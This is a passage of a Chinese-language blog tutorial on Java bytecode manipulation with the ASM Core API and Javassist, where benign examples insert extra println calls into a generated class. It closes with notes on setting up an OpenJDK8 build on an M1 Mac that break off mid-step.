<p>ASM 库提供了两个用于生成和转换已编译类的 API，一个是Core API，以基于 <a href="https://zh.wikipedia.org/wiki/%E8%AE%BF%E9%97%AE%E8%80%85%E6%A8%A1%E5%BC%8F">访问者模式 </a>  来操作类，另一个是Tree API，以基于树节点来操作类。这一章我们讨论 Core API 。</p>

<p>在Core API中有以下几个关键类：</p>

<ul>
  <li>
    <p><strong>ClassReader：</strong>这个类会将 .class 文件读入到 ClassReader 中的字节数组中，它的 accept 方法接受一个 ClassVisitor 实现类，并按照顺序调用 ClassVisitor 中的方法</p>
  </li>
  <li>
    <p><strong>ClassVisitor：</strong>主要负责访问类的成员信息。包括标记在类上的注解、类的构造方法、类的字段、类的方法、静态代码块等。</p>
  </li>
  <li>
    <p><strong>ClassWriter：</strong>ClassWriter 是一个 ClassVisitor 的子类，是和 ClassReader 对应的类，ClassReader 是将 .class 文件读入到一个字节数组中，ClassWriter 是将修改后的类的字节码内容以字节数组的形式输出。</p>
  </li>
</ul>

<p><img src="https://lsieun.github.io/assets/images/java/asm/asm-core-classes.png" alt="ASM里的核心类" /></p>

<p>这里我们先以一个生成全新字节码文件为例子：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">asm.test1</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.objectweb.asm.*</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">HelloWorld</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">generate</span><span class="o">();</span>
        <span class="n">outputClazz</span><span class="o">(</span><span class="n">bytes</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">generate</span><span class="o">()</span> <span class="o">{</span>
        <span class="nc">ClassWriter</span> <span class="n">classWriter</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ClassWriter</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
        <span class="c1">// 定义对象头；版本号、修饰符、全类名、签名、父类、实现的接口</span>
        <span class="n">classWriter</span><span class="o">.</span><span class="na">visit</span><span class="o">(</span><span class="nc">Opcodes</span><span class="o">.</span><span class="na">V1_8</span><span class="o">,</span> <span class="nc">Opcodes</span><span class="o">.</span><span class="na">ACC_PUBLIC</span><span class="o">,</span> <span class="s">"asm/test1/AsmHelloWorld"</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="s">"java/lang/Object"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
        <span class="c1">// 添加方法；修饰符、方法名、描述符、签名、异常</span>
        <span class="nc">MethodVisitor</span> <span class="n">methodVisitor</span> <span class="o">=</span> <span class="n">classWriter</span><span class="o">.</span><span class="na">visitMethod</span><span class="o">(</span><span class="nc">Opcodes</span><span class="o">.</span><span class="na">ACC_PUBLIC</span> <span class="o">+</span> <span class="nc">Opcodes</span><span class="o">.</span><span class="na">ACC_STATIC</span><span class="o">,</span> <span class="s">"main"</span><span class="o">,</span> <span class="s">"([Ljava/lang/String;)V"</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
        <span class="c1">// 执行指令；获取静态属性</span>
        <span class="n">methodVisitor</span><span class="o">.</span><span class="na">visitFieldInsn</span><span class="o">(</span><span class="nc">Opcodes</span><span class="o">.</span><span class="na">GETSTATIC</span><span class="o">,</span> <span class="s">"java/lang/System"</span><span class="o">,</span> <span class="s">"out"</span><span class="o">,</span> <span class="s">"Ljava/io/PrintStream;"</span><span class="o">);</span>
        <span class="c1">// 加载常量 load constant</span>
        <span class="n">methodVisitor</span><span class="o">.</span><span class="na">visitLdcInsn</span><span class="o">(</span><span class="s">"Hello World ASM!"</span><span class="o">);</span>
        <span class="c1">// 调用方法</span>
        <span class="n">methodVisitor</span><span class="o">.</span><span class="na">visitMethodInsn</span><span class="o">(</span><span class="nc">Opcodes</span><span class="o">.</span><span class="na">INVOKEVIRTUAL</span><span class="o">,</span> <span class="s">"java/io/PrintStream"</span><span class="o">,</span> <span class="s">"println"</span><span class="o">,</span> <span class="s">"(Ljava/lang/String;)V"</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
        <span class="c1">// 返回</span>
        <span class="n">methodVisitor</span><span class="o">.</span><span class="na">visitInsn</span><span class="o">(</span><span class="nc">Opcodes</span><span class="o">.</span><span class="na">RETURN</span><span class="o">);</span>
        <span class="c1">// 设置操作数栈的深度和局部变量的大小</span>
        <span class="n">methodVisitor</span><span class="o">.</span><span class="na">visitMaxs</span><span class="o">(</span><span class="mi">2</span><span class="o">,</span> <span class="mi">1</span><span class="o">);</span>
        <span class="c1">// 方法结束</span>
        <span class="n">methodVisitor</span><span class="o">.</span><span class="na">visitEnd</span><span class="o">();</span>
        <span class="c1">// 类完成</span>
        <span class="n">classWriter</span><span class="o">.</span><span class="na">visitEnd</span><span class="o">();</span>
        <span class="c1">// 生成字节数组</span>
        <span class="k">return</span> <span class="n">classWriter</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">();</span>
    <span class="o">}</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">outputClazz</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="c1">// 输出类字节码</span>
        <span class="nc">String</span> <span class="n">pathName</span> <span class="o">=</span> <span class="nc">HelloWorld</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getResource</span><span class="o">(</span><span class="s">""</span><span class="o">).</span><span class="na">getPath</span><span class="o">()</span> <span class="o">+</span> <span class="s">"AsmHelloWorld.class"</span><span class="o">;</span>
        <span class="nc">FileOutputStream</span> <span class="n">out</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">FileOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">pathName</span><span class="o">));</span>
        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"ASM类输出路径："</span> <span class="o">+</span> <span class="n">pathName</span><span class="o">);</span>
        <span class="n">out</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">bytes</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">generate()</code>方法使用ASM框架生成字节数组，<code class="language-plaintext highlighter-rouge">outputClazz()</code>将字节数组输出为<code class="language-plaintext highlighter-rouge">AsmHelloWorld.class</code>，在out的同级目录下：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/02/20220215212618.png" alt="image-20220215212618111" /></p>

<p>刚刚生成了字节码文件只用到了<code class="language-plaintext highlighter-rouge">ClassWriter</code>这一个类，因为我们并没有涉及到修改已有字节码文件的步骤，下一步我们要求在输出<code class="language-plaintext highlighter-rouge">Hello World ASM!</code>后，再输出一行<code class="language-plaintext highlighter-rouge">Hello World ASM Again!</code>。</p>

<p>回到最初介绍3个关键类的地方，<strong>ClassReader</strong> 接收一个 <strong>ClassVisitor</strong> 后，利用 <code class="language-plaintext highlighter-rouge">accept</code> 方法对 <code class="language-plaintext highlighter-rouge">.class</code> 类文件的内容从头到尾扫描一遍，每次扫描到类文件相应的内容时，都会调用<strong>ClassVisitor</strong>内部相应的方法。</p>

<ul>
  <li>扫描到<strong>类文件</strong>时，会回调<code class="language-plaintext highlighter-rouge">ClassVisitor</code>的<code class="language-plaintext highlighter-rouge">visit()</code>方法；</li>
  <li>扫描到<strong>类注解</strong>时，会回调<code class="language-plaintext highlighter-rouge">ClassVisitor</code>的<code class="language-plaintext highlighter-rouge">visitAnnotation()</code>方法；</li>
  <li>扫描到<strong>类成员</strong>时，会回调<code class="language-plaintext highlighter-rouge">ClassVisitor</code>的<code class="language-plaintext highlighter-rouge">visitField()</code>方法；</li>
  <li>扫描到<strong>类方法</strong>时，会回调<code class="language-plaintext highlighter-rouge">ClassVisitor</code>的<code class="language-plaintext highlighter-rouge">visitMethod()</code>方法；</li>
</ul>

<p>……</p>

<p>扫描到相应结构内容时，会回调相应方法，该方法会返回一个对应的字节码操作对象（比如，<code class="language-plaintext highlighter-rouge">visitMethod()</code>返回<code class="language-plaintext highlighter-rouge">MethodVisitor</code>实例），通过修改这个对象，就可以修改<code class="language-plaintext highlighter-rouge">class</code>文件相应结构部分内容，最后将这个<code class="language-plaintext highlighter-rouge">ClassVisitor</code>字节码内容覆盖原来<code class="language-plaintext highlighter-rouge">.class</code>文件就实现了类文件的代码切入。</p>

<p>概念可能有些晦涩，我们带入到上面的例子中理解，在扫描class文件时，有不同方法，我们需要找到main方法进入，所以在重写的<code class="language-plaintext highlighter-rouge">visitMethod()</code>中对方法名进行判断，返回一个自定义的<code class="language-plaintext highlighter-rouge">MethodVisitor</code>，在这个内部对原有代码进行修改。</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">asm.test1</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.objectweb.asm.*</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">HelloWorldAgain</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span><span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="c1">// 1. 创建 ClassReader 读取 .class 文件</span>
        <span class="nc">ClassReader</span> <span class="n">classReader</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ClassReader</span><span class="o">(</span><span class="s">"asm.test1.AsmHelloWorld"</span><span class="o">);</span>
        <span class="c1">// 2. 创建 ClassWriter 对象，将操作之后的字节码的字节数组回写</span>
        <span class="nc">ClassWriter</span> <span class="n">classWriter</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ClassWriter</span><span class="o">(</span><span class="nc">ClassWriter</span><span class="o">.</span><span class="na">COMPUTE_MAXS</span><span class="o">);</span>
        <span class="c1">// 3. 创建自定义的 ClassVisitor 对象 classVisitor 需要委托 classWriter</span>
        <span class="nc">ClassVisitor</span> <span class="n">classVisitor</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">MyVisitor</span><span class="o">(</span><span class="n">classWriter</span><span class="o">);</span>
        <span class="c1">// 4. classReader 再委托给 classVisitor</span>
        <span class="n">classReader</span><span class="o">.</span><span class="na">accept</span><span class="o">(</span><span class="n">classVisitor</span><span class="o">,</span><span class="n">classReader</span><span class="o">.</span><span class="na">EXPAND_FRAMES</span><span class="o">);</span>

        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">classWriter</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">();</span>

        <span class="n">outputClazz</span><span class="o">(</span><span class="n">bytes</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">outputClazz</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="c1">// 输出类字节码</span>
        <span class="nc">String</span> <span class="n">pathName</span> <span class="o">=</span> <span class="nc">HelloWorld</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getResource</span><span class="o">(</span><span class="s">""</span><span class="o">).</span><span class="na">getPath</span><span class="o">()</span> <span class="o">+</span> <span class="s">"AsmHelloWorld.class"</span><span class="o">;</span>
        <span class="nc">FileOutputStream</span> <span class="n">out</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">FileOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">pathName</span><span class="o">));</span>
        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"ASM类输出路径："</span> <span class="o">+</span> <span class="n">pathName</span><span class="o">);</span>
        <span class="n">out</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">bytes</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">class</span>  <span class="nc">MyVisitor</span> <span class="kd">extends</span> <span class="nc">ClassVisitor</span><span class="o">{</span>

        <span class="kd">public</span> <span class="nf">MyVisitor</span><span class="o">(</span><span class="nc">ClassVisitor</span> <span class="n">classVisitor</span><span class="o">)</span> <span class="o">{</span>
            <span class="kd">super</span><span class="o">(</span><span class="nc">Opcodes</span><span class="o">.</span><span class="na">ASM9</span><span class="o">,</span> <span class="n">classVisitor</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="kd">public</span> <span class="nc">MethodVisitor</span> <span class="nf">visitMethod</span><span class="o">(</span><span class="kt">int</span> <span class="n">access</span><span class="o">,</span> <span class="nc">String</span> <span class="n">name</span><span class="o">,</span> <span class="nc">String</span> <span class="n">descriptor</span><span class="o">,</span> <span class="nc">String</span> <span class="n">signature</span><span class="o">,</span> <span class="nc">String</span><span class="o">[]</span> <span class="n">exceptions</span><span class="o">)</span> <span class="o">{</span>
<span class="c1">//            System.out.println("=====================");</span>
<span class="c1">//            System.out.println("acce== " + access);</span>
<span class="c1">//            System.out.println("name== " + name);</span>
<span class="c1">//            System.out.println("desc== " + descriptor);</span>
<span class="c1">//            System.out.println("sign== " + signature);</span>
<span class="c1">//            System.out.println("=====================");</span>
            <span class="nc">MethodVisitor</span> <span class="n">mv</span> <span class="o">=</span> <span class="kd">super</span><span class="o">.</span><span class="na">visitMethod</span><span class="o">(</span><span class="n">access</span><span class="o">,</span> <span class="n">name</span><span class="o">,</span> <span class="n">descriptor</span><span class="o">,</span> <span class="n">signature</span><span class="o">,</span> <span class="n">exceptions</span><span class="o">);</span>
            <span class="c1">// 进入main方法</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">name</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"main"</span><span class="o">)){</span>
                <span class="n">mv</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">MyMethodVisitor</span><span class="o">(</span><span class="nc">Opcodes</span><span class="o">.</span><span class="na">ASM9</span><span class="o">,</span><span class="n">mv</span><span class="o">);</span>
            <span class="o">}</span>
            <span class="k">return</span> <span class="n">mv</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">class</span> <span class="nc">MyMethodVisitor</span> <span class="kd">extends</span>  <span class="nc">MethodVisitor</span><span class="o">{</span>

        <span class="kd">public</span> <span class="nf">MyMethodVisitor</span><span class="o">(</span><span class="kt">int</span> <span class="n">api</span><span class="o">,</span> <span class="nc">MethodVisitor</span> <span class="n">methodVisitor</span><span class="o">)</span> <span class="o">{</span>
            <span class="kd">super</span><span class="o">(</span><span class="n">api</span><span class="o">,</span> <span class="n">methodVisitor</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="nd">@Override</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">visitInsn</span><span class="o">(</span><span class="kt">int</span> <span class="n">opcode</span><span class="o">)</span> <span class="o">{</span>
  					<span class="c1">// System.out.println(opcode);</span>
            <span class="c1">// 找到 return 指令，在 return 执行前插入代码</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">opcode</span> <span class="o">==</span> <span class="nc">Opcodes</span><span class="o">.</span><span class="na">RETURN</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">hack</span><span class="o">(</span><span class="n">mv</span><span class="o">,</span> <span class="s">"Hello World ASM Again!"</span><span class="o">);</span>
            <span class="o">}</span>
            <span class="kd">super</span><span class="o">.</span><span class="na">visitInsn</span><span class="o">(</span><span class="n">opcode</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">hack</span><span class="o">(</span><span class="nc">MethodVisitor</span> <span class="n">mv</span><span class="o">,</span> <span class="nc">String</span> <span class="n">msg</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">mv</span><span class="o">.</span><span class="na">visitFieldInsn</span><span class="o">(</span>
                    <span class="nc">Opcodes</span><span class="o">.</span><span class="na">GETSTATIC</span><span class="o">,</span>
                    <span class="nc">Type</span><span class="o">.</span><span class="na">getInternalName</span><span class="o">(</span><span class="nc">System</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
                    <span class="s">"out"</span><span class="o">,</span>
                    <span class="nc">Type</span><span class="o">.</span><span class="na">getDescriptor</span><span class="o">(</span><span class="nc">PrintStream</span><span class="o">.</span><span class="na">class</span><span class="o">)</span>
            <span class="o">);</span>
            <span class="n">mv</span><span class="o">.</span><span class="na">visitLdcInsn</span><span class="o">(</span><span class="n">msg</span><span class="o">);</span>
            <span class="n">mv</span><span class="o">.</span><span class="na">visitMethodInsn</span><span class="o">(</span>
                    <span class="nc">Opcodes</span><span class="o">.</span><span class="na">INVOKEVIRTUAL</span><span class="o">,</span>
                    <span class="nc">Type</span><span class="o">.</span><span class="na">getInternalName</span><span class="o">(</span><span class="nc">PrintStream</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
                    <span class="s">"println"</span><span class="o">,</span>
                    <span class="s">"(Ljava/lang/String;)V"</span><span class="o">,</span>
                    <span class="kc">false</span>
            <span class="o">);</span>
        <span class="o">}</span>


    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>运行后，成功插入代码：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//</span>
<span class="c1">// Source code recreated from a .class file by IntelliJ IDEA</span>
<span class="c1">// (powered by FernFlower decompiler)</span>
<span class="c1">//</span>

<span class="kn">package</span> <span class="nn">asm.test1</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">AsmHelloWorld</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">var0</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Hello World ASM!"</span><span class="o">);</span>
        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Hello World ASM Again!"</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<h3 id="javassist">Javassist</h3>

<p><strong>ASM</strong> 更偏向于底层，需要了解 <strong>JVM</strong> 虚拟机中指定规范以及对局部变量以及操作数栈的知识，相对而言<strong>Javassist</strong>操作使用上更加容易控制，虽然对对比上会比 <strong>ASM</strong> 性能差一些。</p>

<p>Javassist中最重要的是ClassPool、CtClass、CtMethod、CtField这四个类：</p>

<ul>
  <li><strong>CtClass（compile-time class）</strong>：编译时类信息，它是一个class文件在代码中的抽象表现形式，可以通过一个类的全限定名来获取一个CtClass对象，用来表示这个类文件。</li>
  <li><strong>ClassPool</strong>：从开发视角来看，<strong>ClassPool</strong>是一张保存<strong>CtClass</strong>信息的<strong>HashTable</strong>，<strong>key</strong>为类名，<strong>value</strong>为类名对应的CtClass对象。当我们需要对某个类进行修改时，就是通过<code class="language-plaintext highlighter-rouge">pool.getCtClass("className")</code>方法从pool中获取到相应的CtClass。</li>
  <li><strong>CtMethod、CtField</strong>：这两个比较好理解，对应的是类中的方法和属性。</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">javAssist.test2</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javassist.*</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">HelloWorld</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>

        <span class="nc">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="nc">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
        <span class="nc">CtClass</span> <span class="n">ctClass</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"asm.test1.AsmHelloWorld"</span><span class="o">);</span>
        <span class="nc">CtMethod</span> <span class="n">ctMethod</span> <span class="o">=</span> <span class="n">ctClass</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"main"</span><span class="o">);</span>
        <span class="n">ctMethod</span><span class="o">.</span><span class="na">insertAfter</span><span class="o">(</span><span class="s">"{System.out.println(\"javassist HelloWorld\");}"</span><span class="o">);</span>
        <span class="c1">// 输出类内容</span>
        <span class="n">ctClass</span><span class="o">.</span><span class="na">writeFile</span><span class="o">();</span>
    <span class="o">}</span>

<span class="o">}</span>
</code></pre></div></div>

<p>成功插入：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//</span>
<span class="c1">// Source code recreated from a .class file by IntelliJ IDEA</span>
<span class="c1">// (powered by FernFlower decompiler)</span>
<span class="c1">//</span>

<span class="kn">package</span> <span class="nn">asm.test1</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">AsmHelloWorld</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">var0</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Hello World ASM!"</span><span class="o">);</span>
        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Hello World ASM Again!"</span><span class="o">);</span>
        <span class="nc">Object</span> <span class="n">var2</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"javassist HelloWorld"</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>简单的的确不是一星半点…</p>

<p>笔者认为相比于ASM，Javassist配合Agent技术，在链路监控，修改字节码等等方面可能会简便一些，但是如果涉及到一定规模上的字节码扫描，静态分析，那毫无疑问ASM会高效很多。</p>

<p>最后，本文也是抛砖引玉，站在很多前人的肩膀上的笔记，如果对ASM感兴趣的话，强推一波 <a href="https://lsieun.github.io/">lsieun</a> 师傅的 <a href="https://lsieun.github.io/java/asm/index.html">Java ASM 系列 </a>，我就没见过能有这么详细的教程，真的良心。</p>

<h2 id="后记">后记</h2>

<h3 id="m1编译openjdk">m1编译openjdk</h3>

<p>写了这么多JVM，不自己编译一下也说不过去，目前大多数例子还是以Linux或者intelMac为主，也打算踩一下坑。</p>

<h3 id="环境准备">环境准备</h3>

<ul>
  <li>OS：Mac m1</li>
  <li>IDE：Clion</li>
  <li>源码：OpenJDK8</li>
</ul>

<h4 id="准备编译工具">准备编译工具</h4>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>🌀  c++  git clone https://github.com/AdoptOpenJDK/openjdk-jdk8u    
Cloning into <span class="s1">'openjdk-jdk8u'</span>...
remote: Enumerating objects: 504871, <span class="k">done</span><span class="nb">.</span>
remote: Total 504871 <span class="o">(</span>delta 0<span class="o">)</span>, reused 0 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 504871
Receiving objects: 100% <span class="o">(</span>504871/504871<span class="o">)</span>, 1.00 GiB | 3.59 MiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>416674/416674<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
Updating files: 100% <span class="o">(</span>47413/47413<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
🌀  c++  <span class="nb">ls
</span>openjdk-jdk8u
🌀  c++  <span class="nb">cd </span>openjdk-jdk8u/       
🌀  openjdk-jdk8u <span class="o">[</span>master] <span class="nb">ls
</span>ASSEMBLY_EXCEPTION THIRD_PARTY_README hotspot            make
LICENSE            common             jaxp               nashorn
Makefile           configure          jaxws              <span class="nb">test
</span>README             corba              jdk
README-builds.html get_source.sh      langtools

// 加速编译
brew <span class="nb">install </span>ccache  
// 字体引擎，编译过程中会被依赖到
brew <span class="nb">install </span>freetype 
brew <span class="nb">install </span>autoconf
</code></pre></div></div>

<p>下载Xcode，新版本在APP Store下载即可，低版本需要前往<a href="https://developer.apple.com/download/all/?q=xcode">苹果开发者网站</a>。</p>

<h4 id="配置boot_jdk">配置BOOT_JDK</h4>

<p>我们编译jdk8，就需要准备一个低版本jdk7，其称为<strong>BOOT_JDK</strong>，这种用低版本编译高版本的方式也称为自举。</p>

<h4 id="安装compiledb">安装Compiledb</h4>

<p>需要python3+以及pip3+</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install compiledb
</code></pre></div></div>

<h4 id="配置环境变量">配置环境变量</h4>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 设定语言选项，必须设置</span>
<span class="nb">export </span><span class="nv">LANG</span><span class="o">=</span>C
<span class="c"># Mac平台，C编译器不再是GCC，而是clang</span>
<span class="nb">export </span><span class="nv">CC</span><span class="o">=</span>clang
<span class="nb">export </span><span class="nv">CXX</span><span class="o">=</span>clang++
<span class="nb">export </span><span class="nv">CXXFLAGS</span><span class="o">=</span><span class="nt">-stdlib</span><span class="o">=</span>libc++
<span class="c"># 是否使用clang，如果使用的是GCC编译，该选项应该设置为false</span>
<span class="nb">export </span><span class="nv">USE_CLANG</span><span class="o">=</span><span class="nb">true</span>
<span class="c"># 跳过clang的一些严格的语法检查，不然会将N多的警告作为Error</span>
<span class="nb">export </span><span class="nv">COMPILER_WARNINGS_FATAL</span><span class="o">=</span><span class="nb">false</span>
<span class="c"># 链接时使用的参数</span>
<span class="nb">export </span><span class="nv">LFLAGS</span><span class="o">=</span><span class="s1">'-Xlinker -lstdc++'</span>
<span class="c"># 使用64位数据模型</span>
<span class="nb">export </span><span class="nv">LP64</span><span class="o">=</span>1
<span class="c"># 告诉编译平台是64位，不然会按照32位来编译</span>
<span class="nb">export </span><span class="nv">ARCH_DATA_MODEL</span><span class="o">=</span>64
<span class="c"># 允许自动下载依赖</span>
<span class="nb">export </span><span class="nv">ALLOW_DOWNLOADS</span><span class="o">=</span><span class="nb">true</span>
<span class="c"># 并行编译的线程数，编译时长，为了不影响其他工作，可以选择2</span>
<span class="nb">export </span><span class="nv">HOTSPOT_BUILD_JOBS</span><span class="o">=</span>4
<span class="nb">export </span><span class="nv">PARALLEL_COMPILE_JOBS</span><span class="o">=</span>2 <span class="c">#ALT_PARALLEL_COMPILE_JOBS=2</span>
<span class="c"># 是否跳过与先前版本的比较</span>
<span class="nb">export </span><span class="nv">SKIP_COMPARE_IMAGES</span><span class="o">=</span><span class="nb">true</span>
<span class="c"># 是否使用预编译头文件，加快编译速度</span>
<span class="nb">export </span><span class="nv">USE_PRECOMPILED_HEADER</span><span class="o">=</span><span class="nb">true</span>
<span class="c"># 是否使用增量编译</span>
<span class="nb">export </span><span class="nv">INCREMENTAL_BUILD</span><span class="o">=</span><span class="nb">true</span>
<span class="c"># 编译内容</span>
<span class="nb">export </span><span class="nv">BUILD_LANGTOOL</span><span class="o">=</span><span class="nb">true
export </span><span class="nv">BUILD_JAXP</span><span class="o">=</span><span class="nb">true
export </span><span class="nv">BUILD_JAXWS</span><span class="o">=</span><span class="nb">true
export </span><span class="nv">BUILD_CORBA</span><span class="o">=</span><span class="nb">true
export </span><span class="nv">BUILD_HOTSPOT</span><span class="o">=</span><span class="nb">true
export </span><span class="nv">BUILD_JDK</span><span class="o">=</span><span class="nb">true</span>
<span class="c"># 编译版本</span>
<span class="nb">export </span><span class="nv">SKIP_DEBUG_BUILD</span><span class="o">=</span><span class="nb">true
export </span><span class="nv">SKIP_FASTDEBUG_BULID</span><span class="o">=</span><span class="nb">false
export </span><span class="nv">DEBUG_NAME</span><span class="o">=</span>debug
<span class="c"># 避开javaws和浏览器Java插件之类部分的build</span>
<span class="nb">export </span><span class="nv">BUILD_DEPLOY</span><span class="o">=</span><span class="nb">false
export </span><span class="nv">BUILD_INSTALL</span><span class="o">=</span><span class="nb">false</span>

<span class="c"># 最后需要干掉这两个环境变量（如果你配置过），不然会发生诡异的事件</span>
<span class="nb">unset </span>JAVA_HOME
<span class="nb">unset </span>CLASSPATH

</code></pre></div></div>

<p>注意把当前java版本切换为BOOT_JDK</p>

<p>不切换也行，编译的时候需要加上参数</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>🌀  openjdk-jdk8u <span class="o">[</span>master] ⚡  java <span class="nt">-version</span>
